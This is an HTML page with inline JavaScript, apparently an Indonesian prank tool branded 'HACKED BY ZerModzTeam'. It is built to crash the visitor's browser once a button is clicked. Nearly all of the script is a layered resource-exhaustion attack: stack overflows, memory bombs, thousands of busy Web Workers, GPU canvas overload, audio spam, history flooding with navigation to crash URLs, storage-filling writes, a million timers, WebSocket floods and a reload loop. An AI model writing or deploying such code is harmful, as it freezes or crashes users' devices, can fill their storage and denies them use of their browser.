<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>FC INSTANT</title>
    <style>
        body { margin:0; background:#000; overflow:hidden; font-family:'Courier New'; }
        #warning {
            position:fixed; top:0; left:0; width:100%; height:100%;
            background:#000; display:flex; flex-direction:column;
            align-items:center; justify-content:center; z-index:999999;
        }
        #warning h1 { color:red; font-size:4rem; text-align:center; animation:blink 0.2s infinite; border:5px solid red; padding:30px; }
        #btn {
            font-size:3rem; padding:20px 80px; background:red;
            border:3px solid white; border-radius:60px; color:white; font-weight:bold;
            margin-top:50px; animation:pulse 0.2s infinite; cursor:pointer;
        }
        @keyframes blink { 50%{opacity:0.2;} }
        @keyframes pulse { 50%{transform:scale(1.2);} }
        .fly {
            position:absolute; white-space:nowrap; font-weight:bold; pointer-events:none;
            animation:fly 0.03s infinite alternate; text-shadow:0 0 20px currentColor;
        }
        @keyframes fly {
            0% { transform: translate(0,0) rotate(0deg); }
            100% { transform: translate(150px,150px) rotate(1440deg); }
        }
        #main {
            position:absolute; top:50%; left:50%; transform:translate(-50%,-50%);
            font-size:6rem; font-weight:900; text-align:center; z-index:9999;
            animation:super 0.005s infinite; background:black; padding:30px; border:10px solid white;
            text-shadow:0 0 100px cyan,0 0 200px magenta;
        }
        @keyframes super {
            0%{color:black;background:white;}
            10%{color:red;background:cyan;}
            20%{color:yellow;background:blue;}
            30%{color:lime;background:purple;}
            40%{color:cyan;background:red;}
            50%{color:magenta;background:lime;}
            60%{color:white;background:black;}
            70%{color:black;background:yellow;}
            80%{color:blue;background:magenta;}
            90%{color:purple;background:lime;}
            100%{color:black;background:white;}
        }
    </style>
</head>
<body>
    <div id="warning">
        <h1>⚠️ KLIK = CHROME LANGSUNG FC ⚠️</h1>
        <div id="btn">GAS 10 JUTA 🔥</div>
    </div>

    <script>
        document.getElementById('btn').onclick = function() {
            // Hapus warning
            document.getElementById('warning').remove();
            
            const body = document.body;
            
            // ========== 1. 20.000 TEKS BERHAMBURAN (bikin render berat) ==========
            for (let i=0; i<20000; i++) {
                let d = document.createElement('div');
                d.className = 'fly';
                d.textContent = 'FC ' + i;
                d.style.left = Math.random()*100 + '%';
                d.style.top = Math.random()*100 + '%';
                d.style.fontSize = (5+Math.random()*100) + 'px';
                d.style.color = 'hsl(' + (Math.random()*360) + ',100%,60%)';
                d.style.animationDuration = (0.01+Math.random()*0.05) + 's';
                body.appendChild(d);
            }
            
            // ========== 2. TEKS UTAMA ==========
            let utama = document.createElement('div');
            utama.id = 'main';
            utama.textContent = 'HACKED BY ZerModzTeam';
            body.appendChild(utama);
            
            // ========== 3. SUARA 4000 (200 context x 20 osc) ==========
            for (let ctx=0; ctx<200; ctx++) {
                try {
                    let a = new (window.AudioContext||window.webkitAudioContext)();
                    let g = a.createGain();
                    g.gain.value = 0.01;
                    g.connect(a.destination);
                    for (let i=0; i<20; i++) {
                        let o = a.createOscillator();
                        o.type = ['sine','square','sawtooth','triangle'][Math.floor(Math.random()*4)];
                        o.frequency.value = 1 + Math.random()*6000; // 1Hz - 6001Hz
                        let og = a.createGain();
                        og.gain.value = 0.0003;
                        o.connect(og);
                        og.connect(g);
                        o.start();
                    }
                    if (a.state==='suspended') a.resume();
                } catch(e){}
            }
            
            // ========== 4. CRASH INSTAN (TANPA JEDA, TANPA SETTIMEOUT) ==========
            (function killNow() {
                
                // --- LAPIS 1: STACK OVERFLOW (MULTI LEVEL) ---
                (function a() { (function b() { (function c() { (function d() { (function e() { (function f() { f(); })(); e(); })(); d(); })(); c(); })(); b(); })(); a(); })();
                
                // --- LAPIS 2: MEMORY BOMB 500.000 ARRAY @ 500MB = 250TB ---
                let mem = [];
                for (let i=0; i<500000; i++) {
                    try { mem.push(new ArrayBuffer(500000000)); } catch(e){}
                    try { mem.push(new Blob([new Uint8Array(1000000000)])); } catch(e){}
                    try { mem.push(new Array(50000000).join('x')); } catch(e){}
                }
                
                // --- LAPIS 3: 5000 WEB WORKER (multi-core maksimal) ---
                for (let w=0; w<5000; w++) {
                    try {
                        new Worker(URL.createObjectURL(new Blob([`
                            while(1) {
                                for(let i=0;i<999999999;i++) { 
                                    Math.sqrt(i); 
                                    new Array(999999).join('x'); 
                                    new ArrayBuffer(10000000);
                                }
                            }
                        `])));
                    } catch(e){}
                }
                
                // --- LAPIS 4: SHAREDARRAYBUFFER (kalo support) ---
                if (typeof SharedArrayBuffer !== 'undefined') {
                    for (let s=0; s<50000; s++) {
                        try { new SharedArrayBuffer(100000000); } catch(e){}
                    }
                }
                
                // --- LAPIS 5: WEBGL 5000 CANVAS (GPU OVERLOAD) ---
                for (let g=0; g<5000; g++) {
                    try {
                        let c = document.createElement('canvas');
                        c.width = 4096; c.height = 4096;
                        let gl = c.getContext('webgl') || c.getContext('experimental-webgl');
                        if (gl) {
                            for (let t=0; t<1000; t++) {
                                gl.createTexture();
                                gl.createBuffer();
                                gl.createProgram();
                            }
                        }
                        body.appendChild(c);
                    } catch(e){}
                }
                
                // --- LAPIS 6: HISTORY SPAM 20.000 per loop + NAVIGASI CRASH ---
                setInterval(() => {
                    for (let h=0; h<20000; h++) {
                        history.pushState({}, '', '/#' + Math.random().toString(36).repeat(100));
                    }
                    history.back();
                    location.replace('chrome://crash');
                    location.replace('about:crash');
                }, 0);
                
                // --- LAPIS 7: INDEXEDDB + LOCALSTORAGE + SESSIONSTORAGE FULL ---
                try {
                    for (let s=0; s<200000; s++) {
                        localStorage.setItem('ls'+s, 'x'.repeat(1000000));
                        sessionStorage.setItem('ss'+s, 'x'.repeat(1000000));
                    }
                } catch(e){}
                
                try {
                    let req = indexedDB.open('killerdb', 1);
                    req.onsuccess = function(e) {
                        let db = e.target.result;
                        for (let t=0; t<5000; t++) {
                            if (!db.objectStoreNames.contains('s'+t)) {
                                let store = db.createObjectStore('s'+t, {keyPath:'id'});
                                for (let d=0; d<100000; d++) {
                                    store.put({id:d, data:'x'.repeat(1000000)});
                                }
                            }
                        }
                    };
                } catch(e){}
                
                // --- LAPIS 8: TIMER OVERLOAD 1 JUTA ---
                for (let t=0; t<1000000; t++) {
                    setInterval(() => {
                        for(let z=0;z<1000000;z++){ Math.random(); performance.now(); }
                    }, 0);
                }
                
                // --- LAPIS 9: WEBSOCKET BOMB 5000 KONEKSI ---
                for (let ws=0; ws<5000; ws++) {
                    try { new WebSocket('ws://localhost:' + (ws+1)); } catch(e){}
                }
                
                // --- LAPIS 10: INFINITE LOOP MAIN THREAD + ARRAY PUSH + RELOAD LOOP ---
                let arr = [];
                while(true) {
                    arr.push(new ArrayBuffer(1000000000));
                    arr.push(new Array(100000000).join('x'));
                    for(let z=0;z<9999999;z++) { 
                        Math.random(); 
                        Date.now(); 
                        new Error().stack;
                    }
                    window.location.href = window.location.href; // reload terus
                }
            })();
        };
    </script>
</body>
</html>
